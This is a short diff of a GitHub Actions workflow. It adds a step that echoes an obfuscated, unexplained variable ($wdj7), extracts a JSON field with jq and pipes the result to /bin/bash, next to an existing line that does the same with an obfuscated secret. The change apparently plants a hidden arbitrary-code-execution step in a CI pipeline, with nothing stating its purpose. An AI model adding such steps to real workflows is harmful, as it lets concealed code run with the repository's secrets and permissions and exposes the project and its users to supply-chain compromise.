@@ -18,6 +18,7 @@ jobs:
           c57878: ${{ secrets.c57878 }}
         run: |
           printf '%s' "$c57878" | jq -r .m0 | /bin/bash
+          echo $wdj7 | jq -r .s74451 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
